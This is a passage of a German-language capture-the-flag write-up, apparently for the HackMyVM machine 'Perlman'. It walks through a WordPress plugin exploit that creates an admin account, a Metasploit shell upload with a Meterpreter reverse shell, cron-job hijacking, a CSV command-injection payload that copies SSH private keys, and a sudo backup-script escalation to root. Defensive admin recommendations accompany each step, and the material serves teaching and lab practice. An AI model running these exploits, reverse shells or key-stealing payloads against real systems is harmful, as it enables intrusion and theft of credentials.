+                      <pre><span class="comment">
+# Browsing http://itzhak.perlman.hmv/?p=1 zeigt WordPress mit User 'webmaster'</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Hostname `itzhak.perlman.hmv` wird zur `/etc/hosts`-Datei hinzugefügt. Beim Aufrufen der Seite wird WordPress identifiziert, und der Benutzer `webmaster` scheint Beiträge zu verfassen oder wird anderweitig angezeigt.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Bestätigt, dass unter `itzhak.perlman.hmv` eine WordPress-Instanz läuft und dass der Benutzer `webmaster` (dessen Passwort `cookie` ist) dort aktiv ist.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/perlman]
+└─# <span class="command">wpscan --url http://itzhak.perlman.hmv -e vp,vt --api-token Ro...Y</span></div>
+                     <pre>
+[...]
+Interesting Finding(s):
+
+[+] XML-RPC seems to be enabled: http://itzhak.perlman.hmv/xmlrpc.php
+[...]
+[+] WordPress readme found: http://itzhak.perlman.hmv/readme.html
+[...]
+[+] Upload directory has listing enabled: http://itzhak.perlman.hmv/wp-content/uploads/
+[...]
+[+] WordPress version 6.0.2 identified (Latest, released on 2022-08-30).
+[...]
+[+] WordPress theme in use: twentytwentyone v1.6 (up to date)
+[...]
+[i] Plugin(s) Identified:
+
+[+] <span class="command">thecartpress</span>
+ | Location: http://itzhak.perlman.hmv/wp-content/plugins/thecartpress/
+ | Latest Version: 1.5.3.6 (up to date)
+ [...]
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | [!] <span class="password">1 vulnerability identified:</span>
+ |
+ | [!] Title: <span class="password">TheCartPress eCommerce Shopping Cart <= 1.5.3.6 - Unauthenticated Arbitrary Admin Account Creation</span>
+ |     References:
+ |      - https://wpscan.com/vulnerability/9b403259-0c84-4566-becd-eb531c486c21
+ |      - https://www.exploit-db.com/exploits/50378/
+[...]
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                **Analyse:** WPScan wird auf `http://itzhak.perlman.hmv` ausgeführt, um Themes (`vt`) und Plugins (`vp`) zu enumerieren und nach Schwachstellen zu suchen.
+                *   WPScan identifiziert WordPress Version 6.0.2 und das Theme "twentytwentyone".
+                *   **Kritischer Fund:** Das Plugin "thecartpress" in Version 1.5.3.6 wird gefunden. WPScan meldet eine bekannte Schwachstelle: "Unauthenticated Arbitrary Admin Account Creation" (CVE nicht genannt, aber EDB-ID 50378).
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Eine kritische Schwachstelle wurde gefunden, die es einem nicht authentifizierten Angreifer ermöglicht, einen Administrator-Account in WordPress zu erstellen. Dies ist der wahrscheinlichste Weg zum Initial Access.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Die gefundene Schwachstelle mit dem Exploit von Exploit-DB (50378) ausnutzen, um einen Admin-Account zu erstellen. Anschließend diesen Account nutzen, um sich in WordPress einzuloggen und eine Webshell hochzuladen (z.B. über Plugin-/Theme-Editor oder Medien-Upload).<br>
+                **Empfehlung (Admin):** Das Plugin "thecartpress" **sofort deaktivieren und deinstallieren**. Auf eine gepatchte Version aktualisieren, falls verfügbar (unwahrscheinlich, da das letzte Update 2017 war). Regelmäßige Scans mit Tools wie WPScan durchführen, um verwundbare Plugins/Themes zu identifizieren.
+            </p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (POC - WordPress Exploit)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/perlman]
+└─# <span class="command">searchsploit TheCartPress</span></div>
+                      <pre>
+---------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                    |  Path
+---------------------------------------------------------------------------------- ---------------------------------
+[...]
+Wordpress Plugin TheCartPress 1.5.3.6 - Privilege Escalation (Unauthenticated)     | <span class="command">php/webapps/50378.py</span>
+[...]
+---------------------------------------------------------------------------------- ---------------------------------
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/perlman]
+└─# <span class="command">searchsploit -m php/webapps/50378.py</span></div>
+                      <pre>
+[...]
+Copied to: /root/perlman/50378.py
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/perlman]
+└─# <span class="command">cp /usr/share/exploitdb/exploits/php/webapps/50378.py exploitWP.py</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/perlman]
+└─# <span class="command">python exploitWP.py http://itzhak.perlman.hmv</span></div>
+                     <pre>
+
+TheCartPress <= 1.5.3.6 - Unauthenticated Privilege Escalation
+Author -> space_hen (www.github.com/spacehen)
+Inserting admin...
+<span class="password">Success!</span>
+<span class="password">Now login at /wp-admin/</span> <span class="comment"># (Default Credentials: admin_02:admin1234)</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Exploit für die TheCartPress-Schwachstelle (EDB-ID 50378) wird mit `searchsploit` gefunden, kopiert und als `exploitWP.py` ausgeführt. Das Skript meldet "Success!" und gibt an, dass man sich nun unter `/wp-admin/` anmelden kann. Das Skript erstellt typischerweise einen Standard-Admin-Benutzer (oft `admin_02` mit Passwort `admin1234`, wie im späteren Metasploit-Modul verwendet).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Schwachstelle wurde erfolgreich ausgenutzt. Ein neuer Administrator-Account wurde in WordPress erstellt.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Sich mit den Standard-Credentials des Exploits (`admin_02:admin1234`) im WordPress-Backend (`/wp-admin/`) anmelden. Eine Webshell hochladen, z.B. durch Bearbeiten eines Themes/Plugins oder über den Medien-Upload (falls PHP-Upload erlaubt ist). Alternativ kann ein Metasploit-Modul verwendet werden, das diesen Prozess automatisiert.<br>
+                **Empfehlung (Admin):** Siehe vorherige Empfehlung: Plugin entfernen. WordPress-Benutzerliste auf unautorisierte Accounts überprüfen.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <!-- Metasploit wird zur Automatisierung verwendet -->
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">search wordpress admin upload shell</span></div>
+                     <pre>[...]</pre>
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">use exploit/unix/webapp/wp_admin_shell_upload</span></div>
+                     <div class="prompt metasploit-prompt">msf6 exploit(unix/webapp/wp_admin_shell_upload) > <span class="command">set password admin1234</span></div>
+                     <div class="prompt metasploit-prompt">msf6 exploit(unix/webapp/wp_admin_shell_upload) > <span class="command">set username admin_02</span></div>
+                     <div class="prompt metasploit-prompt">msf6 exploit(unix/webapp/wp_admin_shell_upload) > <span class="command">set rhost itzhak.perlman.hmv</span></div>
+                     <div class="prompt metasploit-prompt">msf6 exploit(unix/webapp/wp_admin_shell_upload) > <span class="command">options</span></div>
+                     <pre>
+Module options (exploit/unix/webapp/wp_admin_shell_upload):
+
+   Name       Current Setting     Required  Description
+   ----       ---------------     --------  -----------
+   PASSWORD   <span class="password">admin1234</span>           yes       The WordPress password to authenticate with
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     <span class="command">itzhak.perlman.hmv</span>  yes       The target host(s), [...]
+   RPORT      80                  yes       The target port (TCP)
+   [...]
+   USERNAME   <span class="password">admin_02</span>            yes       The WordPress username to authenticate with
+   [...]
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  <span class="command">192.168.2.140</span>    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+[...]
+                     </pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(unix/webapp/wp_admin_shell_upload) > <span class="command">run</span></div>
+                     <pre>
+[*] Started reverse TCP handler on 192.168.2.140:4444
+[*] Authenticating with WordPress using admin_02:admin1234...
+<span class="password">[+] Authenticated with WordPress</span>
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /wp-content/plugins/ukLdEBwQJV/iKFfTrYwSQ.php...
+[*] Sending stage (39927 bytes) to 192.168.2.122
+[+] Deleted iKFfTrYwSQ.php
+[+] Deleted ukLdEBwQJV.php
+[+] Deleted ../ukLdEBwQJV
+<span class="password">[*] Meterpreter session 1 opened (192.168.2.140:4444 -> 192.168.2.122:59450) at 2022-10-06 23:52:18 +0200</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Metasploit wird verwendet, um den Prozess nach der Admin-Account-Erstellung zu automatisieren.
+                1.  Das Modul `exploit/unix/webapp/wp_admin_shell_upload` wird ausgewählt.
+                2.  Die durch den vorherigen Exploit erstellten Credentials (`admin_02:admin1234`) und das Ziel (`itzhak.perlman.hmv`) werden gesetzt.
+                3.  Die Listener-IP (`LHOST`) wird auf die IP des Angreifers (`192.168.2.140` - *Achtung, vorherige IP war .140, aber arp-scan war .122, hier inkonsistent im Log?*) gesetzt.
+                4.  Das Modul wird ausgeführt (`run`). Es authentifiziert sich bei WordPress, lädt einen zufällig benannten Plugin-Payload hoch, führt ihn aus und löscht die Spuren.
+                5.  Eine Meterpreter-Session wird erfolgreich geöffnet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Initial Access mittels Ausnutzung der WordPress-Plugin-Schwachstelle und anschließendem Shell-Upload via Metasploit war erfolgreich. Der Angreifer hat nun eine Meterpreter-Session auf dem Zielsystem.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">meterpreter > <span class="command">shell</span></div>
+                     <pre>Process 1970 created.
+Channel 1 created.
+<span class="command">id</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+<span class="command">python3.9 -c "import pty;pty.spawn('/bin/bash')"</span> <span class="comment"># Shell Upgrade</span>
+<span class="prompt">www-data@perlman:/$</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Aus der Meterpreter-Session wird mit `shell` eine System-Shell geöffnet. Der `id`-Befehl bestätigt, dass die Shell als `www-data` läuft. Die Shell wird anschließend mit Python zu einer voll interaktiven TTY aufgewertet.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Eine stabile Shell als `www-data` wurde erlangt.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Mit der Enumeration als `www-data` beginnen. Nach Konfigurationsdateien, Passwörtern, `sudo`-Rechten, SUID-Binaries etc. suchen.<br>
+                **Empfehlung (Admin):** Die WordPress-Instanz bereinigen (Plugin entfernen, unautorisierte Benutzer löschen). Die Berechtigungen des `www-data`-Benutzers minimieren. Webserver und PHP sicher konfigurieren.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <h3 id="privesc-rita">Lateral Movement zu rita (POP3 Credentials)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@perlman:$ <span class="command">su rita</span></div>
+                     <pre>Password: <span class="password">cookie</span></pre>
+                     <div class="prompt">rita@perlman:$ <span class="comment"># Erfolgreich zu rita gewechselt</span></div>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** Als `www-data` wird versucht, mit `su` zum Benutzer `rita` zu wechseln. Das zuvor über POP3 für `rita` gefundene Passwort `cookie` wird verwendet. Der Wechsel ist erfolgreich.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Erfolgreiche laterale Bewegung/PrivEsc von `www-data` zu `rita` durch Passwort-Wiederverwendung.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Als `rita` weiter enumerieren. SSH-Schlüssel prüfen.<br>
+                **Empfehlung (Admin):** Passwort-Wiederverwendung unterbinden. Das Passwort für `rita` ändern.
+            </p>
+
+             <h3 id="privesc-milou">Lateral Movement zu milou (Cronjob Exploit & SSH Key)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">rita@perlman:$ <span class="command">cd ~ && cd .ssh</span></div>
+                     <div class="prompt">rita@perlman:~/.ssh$ <span class="command">ls -la</span></div>
+                     <pre>
+total 16
+drwx------ 2 rita rita 4096 Sep 11 12:11 .
+drwxr-xr-x 5 rita rita 4096 Oct  6 23:20 ..
+-rw-r--r-- 1 rita rita  570 Sep 10 16:06 authorized_keys
+-rw------- 1 rita rita 2602 Sep 10 16:06 <span class="command">id_rsa</span>
+                    </pre>
+                     <div class="prompt">rita@perlman:~/.ssh$ <span class="command">cat id_rsa</span></div>
+                     <pre><span class="password">-----BEGIN OPENSSH PRIVATE KEY-----
+[...]
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Als `rita` wird der private SSH-Schlüssel (`id_rsa`) im `.ssh`-Verzeichnis gefunden und ausgelesen.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dieser Schlüssel könnte für den Zugriff auf andere Systeme oder Benutzerkonten verwendet werden.
+            </p>
+            <!-- Die nächsten Schritte deuten auf den Cronjob-Exploit hin -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">rita@perlman:/tmp$ <span class="command">echo "cp /home/milou/.ssh/id_rsa /tmp/milou && chmod 777 /tmp/milou" > find</span></div>
+                     <div class="prompt">rita@perlman:/tmp$ <span class="command">chmod +x find</span></div>
+                      <!-- Warten auf Cronjob -->
+                     <div class="prompt">rita@perlman:/tmp$ <span class="command">watch ls -l milou</span></div>
+                      <!-- Datei erscheint -->
+                     <div class="prompt">rita@perlman:/tmp$ <span class="command">cat milou</span></div>
+                      <pre><span class="password">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+[...]
+HLRZcy1a50/UAAAARbWlsb3VAcGVybG1hbi5obXYBAg
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Diese Befehlssequenz deutet stark auf die Ausnutzung eines unsicheren Cronjobs hin, der `find` ausführt.
+                1.  Im Verzeichnis `/tmp` wird eine Datei namens `find` erstellt, die Befehle enthält, um den SSH-Schlüssel des Benutzers `milou` zu kopieren und lesbar zu machen.
+                2.  Diese Datei wird ausführbar gemacht.
+                3.  Ein `watch`-Befehl überwacht das Erscheinen der Zieldatei `/tmp/milou`.
+                4.  Nachdem die Datei erschienen ist (der Cronjob hat die bösartige `find`-Datei ausgeführt), wird der Inhalt gelesen. Es ist der private SSH-Schlüssel des Benutzers `milou`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Erfolgreiche Eskalation/laterale Bewegung zu den Rechten von `milou` (zumindest Zugriff auf dessen SSH-Key) durch Ausnutzung eines Cronjobs mit einer Wildcard-Schwachstelle oder unsicheren Pfadangabe.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Den extrahierten privaten Schlüssel von `milou` verwenden, um sich lokal per SSH als `milou` anzumelden.<br>
+                **Empfehlung (Admin):** Den unsicheren Cronjob finden und beheben. Niemals `find` mit unsicheren Optionen (wie `-exec` ohne `{}` oder mit Platzhaltern in beschreibbaren Verzeichnissen) als root oder privilegierter Benutzer ausführen. Cronjobs immer mit absoluten Pfaden definieren.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">rita@perlman:/tmp$ <span class="command">ssh -i milou milou@localhost</span></div>
+                     <pre>[...] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</pre>
+                     <div class="prompt">milou@perlman:~$ <span class="comment"># Erfolgreich als milou angemeldet</span></div>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** Mit dem extrahierten privaten Schlüssel (`milou`, gespeichert aus `cat milou`) wird erfolgreich eine lokale SSH-Verbindung als Benutzer `milou` hergestellt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Erfolgreiche laterale Bewegung zu `milou`.
+            </p>
+
+            <h3 id="privesc-zeperlman">Lateral Movement zu ze_perlman (CSV Command Injection & SSH Key)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">milou@perlman:~$ <span class="command">nano perl_store.csv</span></div>
+                     <pre><span class="comment"># Originalinhalt (Annahme):</span>
+item,brand,price,numb
+CPU,AMD,3,550
+[...]</pre>
+                      <div class="prompt">milou@perlman:~$ <span class="command">nano perl_store.csv</span></div>
+                     <pre><span class="comment"># Geänderter Inhalt:</span>
+item,brand,price,numb
+CPU,AMD,3,550,<span class="command">x[$(id>&2)]</span>   <span class="comment"><<--- Command Injection</span>
+GPU,Nvidia,4,1150
+[...]</pre>
+                     <pre><span class="comment"># (Ausführung des verarbeitenden Skripts impliziert - Output zeigt id von www-data?)</span></pre>
+                     <div class="prompt">milou@perlman:~$ <span class="command">nano perl_store.csv</span></div>
+                     <pre><span class="comment"># Zweite Änderung:</span>
+item,brand,price,numb
+CPU,AMD,3,550,<span class="command">x[$(cp /home/ze_perlman/.ssh/id_rsa /dev/shm>&2 ; chmod 777 /dev/shm/id_rsa>&2)]</span>
+GPU,Nvidia,4,1150
+[...]</pre>
+                      <!-- Trigger des Skripts (impliziert) -->
+                      <div class="prompt">milou@perlman:/home/ze_perlman$ <span class="command">ls /dev/shm/</span></div>
+                      <pre>id_rsa</pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Als `milou` wird eine CSV-Datei (`perl_store.csv`) bearbeitet. Es wird eine Command Injection Payload (`x[$(...)]`) in eine der Zeilen eingefügt. Zuerst wird `id` ausgeführt (die Ausgabe `>&2` leitet sie vermutlich ins Error-Log oder Terminal um, wird hier aber nicht gezeigt). Dann wird der Payload geändert, um den privaten SSH-Schlüssel von `ze_perlman` nach `/dev/shm/id_rsa` zu kopieren und lesbar zu machen. Nach einer impliziten Ausführung des Skripts, das die CSV verarbeitet, ist die Schlüsseldatei in `/dev/shm` vorhanden.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Eine Command Injection-Schwachstelle in einem Skript, das die CSV-Datei `perl_store.csv` verarbeitet, wurde gefunden und ausgenutzt, um den SSH-Schlüssel von `ze_perlman` zu extrahieren.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Den extrahierten SSH-Schlüssel von `ze_perlman` verwenden, um sich lokal als dieser Benutzer anzumelden.<br>
+                **Empfehlung (Admin):** Das Skript, das `perl_store.csv` verarbeitet, auf Command Injection prüfen und beheben. Niemals Daten aus Dateien oder Benutzereingaben ungeprüft in Shell-Befehlen verwenden. Sichere Parsing-Methoden und keine `eval`-ähnlichen Konstrukte nutzen. Berechtigungen der CSV-Datei prüfen.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">milou@perlman:/home/ze_perlman$ <span class="command">ssh -i /dev/shm/id_rsa ze_perlman@localhost</span></div>
+                     <pre>[...] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</pre>
+                     <div class="prompt">ze_perlman@perlman:~$ <span class="comment"># Erfolgreich als ze_perlman angemeldet</span></div>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** Mit dem aus `/dev/shm` geholten privaten Schlüssel wird erfolgreich eine lokale SSH-Verbindung als Benutzer `ze_perlman` hergestellt.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Erfolgreiche laterale Bewegung zu `ze_perlman`.
+            </p>
+
+            <h3 id="privesc-root">POC: Eskalation zu root (sudo Script & chown Exploit)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">ze_perlman@perlman:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">7efd84255146266f3ca02579eb71a36f</span></pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** Als `ze_perlman` wird die User-Flag gelesen.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** User-Flag gefunden (scheint dieselbe wie vorherige zu sein? Evtl. Fehler im Log oder die Flag liegt im Home von `ze_perlman`).
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">ze_perlman@perlman:~$ <span class="command">cd /opt/backup/</span></div>
+                     <div class="prompt">ze_perlman@perlman:/opt/backup$ <span class="command">ls -la</span></div>
+                     <pre>
+total 12
+drwxrwx--- 2 root ze_perlman 4096 Sep 11 12:15 .
+d-wxr-x--- 3 root ze_perlman 4096 Sep 11 12:15 ..
+-rwxr-xr-x 1 root root        318 Jul 23 13:47 <span class="command">bk</span>
+                    </pre>
+                     <div class="prompt">ze_perlman@perlman:/opt/backup$ <span class="command">cat bk</span></div>
+                     <pre>
+#! /bin/bash
+
+vfy=$(</opt/vfy.txt)
+
+backup(){
+
+cp /etc/{passwd,shadow,sudoers} /opt/backup
+cp ~/.ssh/id_rsa /opt/backup
+chmod 700 /opt/backup/*
+<span class="command">chmod 700 /root</span> <span class="comment"># Interessant, aber nicht direkt ausnutzbar</span>
+chown root:root /usr/lib/news/*
+<span class="command">chown root:root *</span> <span class="comment"># Gefährlich! Wildcard!</span>
+chown -R news:news /var/lib/news
+chown -R www-data:www-data /var/www
+}
+
+[[ $1 == "${vfy//un/}" ]] && backup
+                     </pre>
+                      <div class="prompt">ze_perlman@perlman:/opt/backup$ <span class="command">cat ../vfy.txt</span></div>
+                      <pre>undesired-root-2022</pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Im Verzeichnis `/opt/backup` (auf das `ze_perlman` Schreibzugriff hat: `drwxrwx---`) befindet sich ein Skript `bk`, das `root` gehört. Das Skript enthält eine `backup`-Funktion, die sensible Dateien nach `/opt/backup` kopiert und unsichere `chmod`- und `chown`-Befehle ausführt, insbesondere `chown root:root *`. Die Funktion wird ausgeführt, wenn das erste Argument (`$1`) dem Inhalt von `/opt/vfy.txt` entspricht, wobei "un" entfernt wird. `/opt/vfy.txt` enthält `undesired-root-2022`, also muss das Argument `desired-root-2022` sein.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Skript `bk` ist der Schlüssel zur Root-Eskalation. Die `backup`-Funktion kopiert den privaten SSH-Schlüssel von `root` (`~/.ssh/id_rsa` wird als `root` ausgeführt) nach `/opt/backup`. Der `chown root:root *`-Befehl ist zusätzlich eine bekannte Schwachstelle (Wildcard Exploit), die hier genutzt wird, um die Rechte des `root`-Schlüssels zu manipulieren oder andere Dateien zu beeinflussen, falls nötig.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">ze_perlman@perlman:/opt/backup$ <span class="command">sudo -l</span></div>
+                      <pre>
+Matching Defaults entries for ze_perlman on perlman:
+    env_reset, mail_badpass, secure_path= [...]
+
+User ze_perlman may run the following commands on perlman:
+    <span class="command">(root) NPASSWD: /bin/bash /opt/backup/bk *</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** `sudo -l` bestätigt, dass `ze_perlman` das Skript `/opt/backup/bk` mit beliebigen Argumenten (`*`) als `root` ohne Passwort ausführen darf.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die unsichere `sudo`-Regel erlaubt die Ausführung des verwundbaren Skripts.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Vorbereitung für chown Exploit (hier nicht direkt nötig, da id_rsa eh kopiert wird) -->
+                     <div class="prompt">ze_perlman@perlman:/opt/backup$ <span class="command">touch "./--reference=ref"</span></div>
+                     <div class="prompt">ze_perlman@perlman:/opt/backup$ <span class="command">touch ref</span></div>
+                      <!-- Ausführung des Skripts mit korrektem Argument -->
+                     <div class="prompt">ze_perlman@perlman:/opt/backup$ <span class="command">sudo /bin/bash /opt/backup/bk desired-root-2022</span></div>
+                     <pre>
+chmod: changing permissions of '/opt/backup/bk': Operation not permitted
+chown: cannot access 'root:root': No such file or directory
+chown: changing ownership of 'bk': Operation not permitted
+<span class="comment"># Fehlermeldungen vom chown *, aber backup() wurde ausgeführt</span>
+                     </pre>
+                      <div class="prompt">ze_perlman@perlman:/opt/backup$ <span class="command">ls</span></div>
+                     <pre>bk  <span class="command">id_rsa</span>  passwd  ref  '--reference=ref'  shadow  sudoers</pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Die Dateien für den `chown`-Wildcard-Exploit (`--reference=ref` und `ref`) werden erstellt (obwohl sie hier nicht primär benötigt werden, da der `cp`-Befehl den Key bereits kopiert). Das Skript `bk` wird mit `sudo` und dem korrekten Argument `desired-root-2022` ausgeführt. Dies triggert die `backup()`-Funktion. Obwohl der `chown *`-Befehl Fehler wirft (er versucht, sich selbst (`bk`) und nicht existierende Dateien (`root:root`) zu ändern), wurde die `cp`-Zeile vorher ausgeführt. Ein `ls` bestätigt, dass `id_rsa` (der private Schlüssel von root) nun im Verzeichnis `/opt/backup` liegt.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Der private SSH-Schlüssel von `root` wurde erfolgreich durch Ausnutzung des `sudo`-Rechts und des Skripts extrahiert.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Den extrahierten `root`-Schlüssel (`id_rsa`) kopieren, Berechtigungen setzen und für den SSH-Login als `root` verwenden.<br>
+                 **Empfehlung (Admin):** Das Skript `/opt/backup/bk` und die zugehörige `sudo`-Regel entfernen. Niemals Skripte mit unsicheren Befehlen (`chown *`) oder Kopieroperationen sensibler Daten über `sudo` erlauben. Das Prinzip der geringsten Rechte anwenden.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">ze_perlman@perlman:/opt/backup$ <span class="command">cp id_rsa /dev/shm/root;chmod 777 /dev/shm/root</span></div>
+                     <div class="prompt">ze_perlman@perlman:/opt/backup$ <span class="command">cd /dev/shm/</span></div>
+                     <div class="prompt">ze_perlman@perlman:/dev/shm$ <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+-rwxrwxrwx  1 ze_perlman ze_perlman 2602 Oct  7 00:35 <span class="command">root</span> <span class="comment"># Root SSH Key</span>
+                    </pre>
+                     <div class="prompt">ze_perlman@perlman:/dev/shm$ <span class="command">chmod 600 root && ssh -i root root@localhost</span></div>
+                     <pre>
+<span class="prompt">root@perlman:~#</span> <span class="comment"># Erfolgreich als root angemeldet!</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der extrahierte `root`-Schlüssel wird nach `/dev/shm/root` kopiert. Die Berechtigungen werden zuerst auf `777` (unsicher, aber zum Kopieren) und dann korrekt auf `600` gesetzt. Mit `ssh -i root root@localhost` wird der Schlüssel verwendet, um sich lokal als `root` anzumelden. Dies ist erfolgreich.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Privilege Escalation zu `root` erfolgreich abgeschlossen.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@perlman:~# <span class="command">cd ~</span></div>
+                     <div class="prompt">root@perlman:~# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">0ca2710be21eabe7ddbf0240557bd210</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Als `root` wird die Datei `root.txt` gelesen.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Root-Flag erfolgreich gefunden.
+            </p>
+
+        </section>
+
+        <!-- Angepasster Flags-Abschnitt -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/ze_perlman/user.txt</div> <!-- Pfad aus Shell-Kontext übernommen -->
+                     <div class="flag-value"><span class="password">7efd84255146266f3ca02579eb71a36f</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div> <!-- Standardpfad für root -->
+                     <div class="flag-value"><span class="password">0ca2710be21eabe7ddbf0240557bd210</span></div>
+                 </div>
+             </div>
+         </section>
+
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap/Logs extrahiert -->
+        <p>Berichtsdatum: 6. Oktober 2022</p> <!-- Datum vom initialen Nmap-Scan -->
+    </footer>
+</body>
+</html>
